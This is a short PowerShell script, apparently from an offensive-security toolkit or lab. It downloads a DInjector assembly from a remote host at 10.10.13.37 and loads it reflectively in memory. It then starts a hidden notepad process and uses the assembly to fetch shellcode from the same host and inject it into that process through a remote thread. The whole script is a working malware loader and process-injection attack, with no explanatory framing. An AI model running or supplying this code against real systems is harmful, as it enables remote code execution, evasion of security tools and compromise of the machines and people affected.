$data = (New-Object System.Net.WebClient).DownloadData("http://10.10.13.37/DInjector.dll")
[System.Reflection.Assembly]::Load($data) | Out-Null

$procId = (Start-Process -WindowStyle Hidden -PassThru notepad).Id
$cmd = "remotethread /sc:http://10.10.13.37/shellcode.bin /pid:$procId"

[DInjector.Program]::Main($cmd.Split(" "))
